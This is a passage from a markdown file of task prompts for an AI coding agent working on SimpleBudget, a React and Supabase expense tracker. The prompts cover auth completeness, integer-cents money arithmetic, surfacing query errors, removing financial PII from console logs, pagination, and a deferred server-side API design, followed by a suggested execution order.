   - Clear the URL fragment afterwards so the token is not left in history.
3. Fix GAP 2:
   - After `signUp`, inspect the returned `data.session`.
   - If a session exists -> proceed as today.
   - If NOT -> show a clear "Check your email to confirm your account, then sign in." state. Do NOT
     navigate to the dashboard.
4. Check whether `signUp` currently also passes `emailRedirectTo`; if not, add it pointing at your
   deployed domain so confirmation emails land correctly.
5. UX REQUIREMENTS FOR OLDER USERS:
   - Large tap targets (match the existing `btn-primary` sizing).
   - Plain language. No jargon like "session", "token", or "auth".
   - Visible focus states, correct `aria-*` attributes, full keyboard operability, and Escape-to-close
     consistent with the existing modal behaviour in `AuthModal.tsx:35-61`.
   - Errors must be readable by a non-technical person.
6. Add rate-limit/lockout UX: after repeated failed sign-ins from one client, show a gentle message
   telling the user to wait. (Supabase enforces server-side too; this is the client-side courtesy layer.)

VERIFICATION (all mandatory):
- `npx tsc --noEmit` passes.
- `npx vitest run` passes.
- MANUAL TEST with real Supabase dev credentials — report honestly on each:
  (1) forgot-password request actually delivers a reset email,
  (2) the reset link returns to the app and a NEW password can be set,
  (3) the new password works on sign-in and the old one fails,
  (4) signup with confirmation ON produces the new "check your email" state and does NOT land on a broken dashboard,
  (5) signup with confirmation OFF still signs straight in.
- Document the required Supabase dashboard configuration (Auth -> URL Configuration: Site URL, additional
  redirect URLs) and the required Vercel env var for the redirect origin.

NOTE: do NOT assume the Supabase project's current email/URL configuration. If confirmation is currently
OFF in production, say so — that changes which code path is the common case and affects what to prioritise.
Ask me if you cannot determine it.

RULES: Feature branch. Do not change the existing sign-in/sign-up happy path's visual design. Do not push
to main.
```

---

# PROMPT 10 — Data Integrity & Polish

```text
You are working on SimpleBudget, a React 18 + TypeScript + Vite expense tracker (repo: patelVasu27/budget_tracker).
Supabase (Postgres) backend. Run this AFTER the bloat-removal phase.

BACKGROUND — four confirmed issues from a security/quality audit. All are small, independent, and low-risk.

=== ISSUE 1: Float money arithmetic (correctness, medium severity) ===
`src/features/Dashboard.tsx:283-290` computes the headline balance with JS float addition:
    const totalExpenses = transactions.filter(tx => tx.type === 'expense').reduce((sum, tx) => sum + tx.amount, 0)
    const remainingBalance = totalIncome - totalExpenses
The database column is `NUMERIC(10,2)` (`supabase/schema.sql:13`). JS `number` is IEEE-754 float, so sums
drift — the app's headline "Remaining" number will eventually be off by a cent. The same pattern appears in
`src/lib/export.ts:57` and `:89`.
Additionally, `supabase/schema.sql:13` has `CHECK (amount >= 0)`, which makes refunds and corrections
impossible.

FIX: introduce integer-cents arithmetic. Store and compute amounts as integer cents (or use a decimal-safe
helper) throughout the calculation and export paths. Keep the on-disk `NUMERIC(10,2)` schema — only the
in-app representation changes — UNLESS you conclude the column must change too, in which case explain the
migration and stop for my approval. Also propose (do not unilaterally apply) relaxing the `amount >= 0`
constraint so negative/refund entries are possible, and explain how the UI would need to change.

=== ISSUE 2: Silent failures on every read (high severity for trust) ===
`src/features/Dashboard.tsx:60` and `:158` destructure only `{ data }` and DISCARD `error`:
    const { data } = await supabase.from('transactions').select('*')...
If RLS blocks the request, the network drops, or the token expires, the app silently renders "no
transactions". A user concludes their financial data has vanished. It also masks genuine attacks.

FIX: handle `error` on every query. On failure show a clear, non-technical message with a Retry action —
not an empty list. Apply consistently across `Dashboard.tsx`, `ExportModal.tsx`, and `useCategories.ts`.
Match the existing error-styling pattern (see `AddExpenseModal.tsx:201` which already does
`onError: (err) => setError(err.message)`).

=== ISSUE 3: Financial PII in browser console (privacy) ===
`src/features/Dashboard.tsx:246`:
    console.info('[Voice Parsing]', { transcript, amount, category, note })
Voice transcripts are SPOKEN financial data ("spent 450 on groceries at Reliance"). Anyone with brief
physical access to the device, or any browser extension, can read it.

FIX: remove this log, or reduce it to a boolean/shape-only log that contains NO user content
(e.g. `{ amount, category, type }` with the transcript omitted). Apply the same standard to any other
`console.*` call that emits user data — audit the whole `src/` tree for this.

=== ISSUE 4: Unbounded queries (no pagination) ===
`src/features/Dashboard.tsx:154-164` and `src/components/ExportModal.tsx:75-81` fetch every matching row
with no limit. For exports this is intentional, but the dashboard query should be bounded/paginated.

FIX: add a sensible limit plus pagination to the dashboard transaction query only. Do NOT limit the export
query — exporting everything is the point of export. Keep the existing sort order intact
(`order('date', { ascending: false })`).

VERIFICATION (all mandatory):
- `npx tsc --noEmit` passes.
- `npx vitest run` passes.
- ADD unit tests for the cents arithmetic covering: a sum that would drift under floats (e.g. 0.1 + 0.2),
  an exact-cent input like 10.05, a zero-value transaction, and a single large value.
- MANUAL TEST: add several transactions with awkward amounts (0.1, 0.2, 10.05, 999.99), confirm the
  displayed Remaining is exactly correct, export to CSV and XLSX, confirm those totals match the screen.
- Manually trigger a query error (e.g. temporarily point at a bad URL) and confirm the new error UI appears
  with a working Retry, rather than an empty list.

RULES: Feature branch. Preserve the existing UI and visual design — error states should match the current
styling language. Do not push to main. Report honestly on anything you could not verify.
```

---

# PROMPT 11 — Thin API Layer (IMPLEMENTED)

```text
You are working on SimpleBudget, a React 18 + TypeScript + Vite expense tracker (repo: patelVasu27/budget_tracker).
Currently: Supabase (Postgres + Auth + RLS) accessed DIRECTLY from the browser. Vercel-hosted. Solo
maintainer, $0 budget.

!! READ FIRST: THIS PHASE IS DEFERRED. Do not start it unless explicitly told to. It only makes sense
AFTER Prompts 1-9 are complete, verified, and committed. !!

BACKGROUND — the legitimate architectural criticism of the current setup:
The Supabase anon key ships to every browser (this is BY DESIGN and is not itself a flaw), and RLS is the
ONLY thing enforcing authorization. That means the entire security model is SQL policies which, until now,
had zero automated test coverage. Prompt 6 added those tests, which materially reduces the risk — but the
model still has no server-side enforcement that a request comes from an authenticated session.

There is ALSO a client-trust weakness: identity is decided client-side. `src/stores/authStore.ts:42` reads
`localStorage.getItem('isGuest')` and `src/features/Dashboard.tsx:37` derives
`activeUserId = isGuest ? 'guest' : user?.id`. Flipping that key in devtools switches the app's data source.

THE POINT OF THIS PHASE: put a thin server-side API in front of the SAME Supabase Postgres. Do NOT migrate
off Supabase — that was evaluated and rejected. Keep Postgres, keep the database, optionally keep Supabase
Auth. Add ~10 Vercel serverless functions (free on Vercel Hobby).

TASK — and STOP after producing a DESIGN DOCUMENT. Do not implement yet. I want to approve the design first.
The design document must cover:
1. Endpoint list: method, path, auth requirement, request shape, response shape, error codes.
2. How authentication works: Supabase JWT verified server-side on every request; HTTP-only, Secure,
   SameSite=Lax session cookie; token refresh strategy; what happens when the token expires mid-session.
3. How authorization is enforced: every handler derives `user_id` from the VERIFIED SERVER-SIDE session —
   never from a request body, query param, or header supplied by the client. This is the whole point.
4. How RLS fits: it stays enabled as defense-in-depth; the API connects as a trusted role while the
   per-user filter is applied in application code and verified by RLS.
5. Migration strategy: how to move the 6 client call sites over without breaking the app, and how to roll
   back. Must be reversible at every step.
6. Cost check against Vercel Hobby limits — confirm this fits at $0, and say what happens if it does not.
7. Testing strategy: how each handler's authorization gets unit-tested (this is the payoff — authorization
   becomes TypeScript you can test, not SQL you can only hope for).
8. Effort estimate and a recommendation: is this actually worth it for a solo maintainer at this stage of
   the product? Give me a straight answer, including the case for NOT doing it.

Deliver `docs/API_LAYER_DESIGN.md` and nothing else. Then stop and wait for my approval.
```

---

## Suggested execution order

```
1.  Prompt 1   Preflight & baseline              (no code changes)
2.  Prompt 2   Security headers                  (~15 min, kills clickjacking)
3.  Prompt 3   Authz hardening + injection + images (~1 hr)
4.  Prompt 4   Phase 0 safety net                (~1 hr, infra only)
5.  Prompt 5   Phase 1 bloat removal             (1-2 days, biggest win)
6.  Prompt 6   Cross-user isolation tests        (half day)
7.  Prompt 7   Phase 2 unify data layer          (2-3 days)
8.  Prompt 8   Month navigation & history        (1-2 days, requires Prompt 7)
9.  Prompt 9   Auth completeness                 (after bloat, per decision)
10. Prompt 10  Data integrity & polish           (after bloat, per decision)
11. Prompt 11  Thin API layer                    (DEFERRED — design doc only)
```

Why month navigation sits at position 8:
- It needs the unified DataStore from Prompt 7 — otherwise you re-wire ~40 `isGuest` branches.
- It does not depend on auth completeness (9) or money correctness (10), so it can run in parallel
  with those if you have time.
- It must come before the deferred API layer (11) so the API design doc reflects the month-filtered
  endpoints it will eventually serve.

Steps 2-4 together are roughly a day and close every CRITICAL and HIGH finding except the unpatchable
`xlsx` dependency, which Prompt 5 resolves.
